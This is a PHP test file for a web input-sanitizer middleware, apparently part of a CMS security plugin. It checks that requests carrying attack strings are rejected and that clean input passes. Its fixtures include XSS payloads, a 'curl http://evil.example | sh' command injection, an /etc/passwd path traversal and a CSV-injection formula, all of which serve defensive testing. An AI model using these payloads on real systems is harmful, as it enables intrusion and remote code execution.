<?php

declare(strict_types=1);

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Config;
use Wobqqq\Fortify\Models\Fortify;
use Wobqqq\FortifyInputSanitizer\Http\Middlewares\InputSanitizerMiddleware;
use Wobqqq\FortifyInputSanitizer\Services\PatternMatcher;

it('adds its middleware to the site only while enabled', function (): void {
    expect(Config::get('cms.middleware_group'))->toBe('web');

    configureInputSanitizer();

    expect(Config::get('cms.middleware_group'))->toBe(['web', InputSanitizerMiddleware::ALIAS])
        ->and(Config::get('backend.middleware_group'))->toBe('web');
});

it('lets every request through while disabled', function (): void {
    expect(sanitizedRequest('/page', ['q' => '<script>alert(1)</script>'])->getStatusCode())->toBe(200);
});

it('lets clean input through', function (): void {
    configureInputSanitizer();

    $response = sanitizedRequest('/blog/hello-world', ['page' => '2', 'q' => 'flowers & gifts'], [], ['User-Agent' => 'Mozilla/5.0']);

    expect($response->getStatusCode())->toBe(200)->and($response->getContent())->toBe('content');
});

it('refuses each kind of payload with 400 and the configured page', function (string $payload): void {
    configureInputSanitizer();

    $response = sanitizedRequest('/page', ['q' => $payload]);

    expect($response->getStatusCode())->toBe(400)
        ->and($response->getContent())->toContain('Something went wrong');
})->with([
    'xss' => '<script>alert(1)</script>',
    'event handler' => '<img src=x onerror=alert(1)>',
    'javascript uri' => 'javascript:alert(1)',
    'encoded xss' => '%253Cscript%253Ealert(1)',
    'command injection' => 'a; curl http://evil.example | sh',
    'path traversal' => '../../etc/passwd',
    'ssti' => '{{ 7*7 }}',
    'null byte' => "file.php\0.jpg",
    'csv injection' => '=HYPERLINK("http://evil.example")',
]);

it('finds a payload in the form, in nested input, in a header and in the URL', function (string $uri, array $query, array $post, array $headers): void {
    configureInputSanitizer();

    expect(sanitizedRequest($uri, $query, $post, $headers)->getStatusCode())->toBe(400);
})->with([
    'form' => ['/page', [], ['comment' => '<script>x</script>'], []],
    'nested' => ['/page', ['filter' => ['tags' => ['ok', '<iframe src=x>']]], [], []],
    'header' => ['/page', [], [], ['X-Search' => '{{ config }}']],
    'url segment' => ['/page/%3Cscript%3E', [], [], []],
]);

it('skips the excluded inputs and headers, and never scans cookies or Accept', function (): void {
    configureInputSanitizer([
        'excluded_inputs' => [['name' => 'Content']],
        'excluded_headers' => [['name' => 'X-Template']],
    ]);

    expect(sanitizedRequest('/page', [], ['content' => '<script>editor()</script>'])->getStatusCode())->toBe(200)
        ->and(sanitizedRequest('/page', [], [], ['X-Template' => '{{ name }}'])->getStatusCode())->toBe(200)
        ->and(sanitizedRequest('/page', [], [], ['Cookie' => 'a={{b}}', 'Accept' => '*/*; =x'])->getStatusCode())->toBe(200)
        ->and(sanitizedRequest('/page', [], ['title' => '<script>x</script>'])->getStatusCode())->toBe(400);
});

it('counts the matches of the whole request against the threshold', function (): void {
    configureInputSanitizer(['block_threshold' => 3]);

    expect(sanitizedRequest('/page', ['a' => '{{ x }}', 'b' => '../x'])->getStatusCode())->toBe(200)
        ->and(sanitizedRequest('/page', ['a' => '{{ x }}', 'b' => '../x'], [], ['X-Q' => '<script>'])->getStatusCode())->toBe(400);
});

it('keeps the site working with a pattern that does not compile', function (): void {
    configureInputSanitizer(['xss_patterns' => '~(unclosed~', 'ssti_patterns' => '~\{\{.*?\}\}~']);

    expect(sanitizedRequest('/page', ['q' => 'text <script>'])->getStatusCode())->toBe(200)
        ->and(sanitizedRequest('/page', ['q' => '{{ x }}'])->getStatusCode())->toBe(400);
});

it('lets a request through when a pattern gives up on it', function (): void {
    configureInputSanitizer(array_fill_keys([
        'xss_patterns', 'encoded_xss_patterns', 'command_injection_patterns', 'path_traversal_patterns',
        'null_byte_patterns', 'csv_injection_patterns',
    ], '') + ['ssti_patterns' => '~(a+)+$~']);

    $previous = ini_set('pcre.backtrack_limit', '1000');
    ini_set('pcre.jit', '0');

    try {
        expect(sanitizedRequest('/page', ['q' => str_repeat('a', 5000) . 'b'])->getStatusCode())->toBe(200)
            ->and(PatternMatcher::matches('~(a+)+$~', str_repeat('a', 5000) . 'b'))->toBeFalse();
    } finally {
        ini_set('pcre.backtrack_limit', (string)$previous);
        ini_set('pcre.jit', '1');
    }
});

it('turns itself off from the console and keeps its other settings', function (): void {
    configureInputSanitizer(['block_threshold' => 4]);

    expect(Artisan::call('wobqqq.fortify:input-sanitizer:disable'))->toBe(0)
        ->and(Artisan::output())->toContain('Input Sanitizer disabled.')
        ->and(Fortify::get('input_sanitizer.cms_enabled'))->toBeFalse()
        ->and(Fortify::get('input_sanitizer.block_threshold'))->toBe(4);
});
